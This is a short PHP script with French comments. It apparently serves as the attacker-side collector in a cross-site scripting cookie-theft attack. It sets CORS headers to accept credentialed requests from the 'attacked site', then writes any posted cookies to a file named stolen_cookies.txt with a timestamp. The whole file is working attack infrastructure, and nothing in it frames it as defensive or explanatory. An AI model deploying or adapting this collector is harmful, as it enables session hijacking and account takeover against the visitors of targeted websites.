<?php
// 🔹 Autoriser l'origine du site attaqué (NE PAS METTRE "*", il faut une origine spécifique)
header("Access-Control-Allow-Origin: https://mon-site.fr");

// 🔹 Permettre l'envoi des cookies
header("Access-Control-Allow-Credentials: true");

// 🔹 Autoriser les méthodes POST et OPTIONS
header("Access-Control-Allow-Methods: POST, OPTIONS");

// 🔹 Autoriser les headers nécessaires
header("Access-Control-Allow-Headers: Content-Type");

// 🔹 Répondre aux requêtes pré-flight OPTIONS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204); // No Content
    exit();
}

// 🔹 Lire les cookies envoyés
$data = file_get_contents("php://input");
$decodedData = json_decode($data, true);

if (isset($decodedData['cookies'])) {
    file_put_contents("stolen_cookies.txt", "[" . date("Y-m-d H:i:s") . "] " . $decodedData['cookies'] . PHP_EOL, FILE_APPEND);
    echo json_encode(["status" => "success", "message" => "Cookie reçu"]);
} else {
    echo json_encode(["status" => "error", "message" => "Aucun cookie reçu"]);
}
?>
